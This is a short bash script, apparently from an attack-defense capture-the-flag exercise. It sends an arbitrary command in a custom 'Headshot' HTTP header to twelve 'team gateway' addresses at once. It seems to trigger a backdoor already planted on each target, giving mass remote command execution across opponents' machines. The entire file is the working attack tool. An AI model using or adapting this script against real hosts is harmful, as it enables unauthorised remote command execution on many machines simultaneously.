#!/bin/bash

baseIP=192.168.253.

teamGW=(2 6 10 14 18 22 26 30 34 38 42 46) 

command=$@

for i in "${teamGW[@]}"; do
	#echo $i
	curl -k -H "Headshot: $command" $baseIP$i &
	
done
